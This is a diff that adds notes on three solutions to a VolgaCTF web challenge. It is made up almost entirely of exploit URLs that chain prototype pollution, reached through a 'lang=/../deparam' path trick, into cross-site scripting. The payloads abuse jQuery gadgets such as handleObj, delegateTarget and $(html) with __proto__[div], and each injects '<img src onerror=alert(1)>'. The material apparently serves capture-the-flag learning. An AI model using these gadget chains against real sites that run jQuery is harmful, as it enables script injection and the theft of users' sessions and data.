@@ -1,0 +1,27 @@
+============ Solution 1 ============
+
+lang=/../deparam&a[]=1&a[constructor][prototype][__proto__][b]=1
+
+Prototype Pollution
+
+https://wallet.volgactf-task.ru/wallet?lang=/../deparam&X[]=1&X[constructor][prototype][__proto__][preventDefault]=x&X[constructor][prototype][__proto__][handleObj]=x&X[constructor][prototype][__proto__][delegateTarget]=<img/src/onerror%3Dalert(1)>
+
+
+
+
+============ Solution 2 ============
+https://wallet.volgactf-task.ru/wallet?lang=/../deparam&qqq[0]=2&qqq[__proto__][__proto__][div][0]=0&qqq[__proto__][__proto__][div][1]=<img/src/onerror%3Dalert(1)>
+
+
+============ Solution 3 ============
+Source:
+	https://github.com/aszx87410/ctf-writeups/issues/27
+
+
+index.html => can trigger tooltip
+```
+<span class="d-inline-block" tabindex="0" data-toggle="tooltip" title="Not implemented yet" id="depositButton">
+```
+
+$(html) jQuery all versions
+	?__proto__[div][0]=1&__proto__[div][1]=<img src onerror%3dalert(1)>&__proto__[div][2]=1
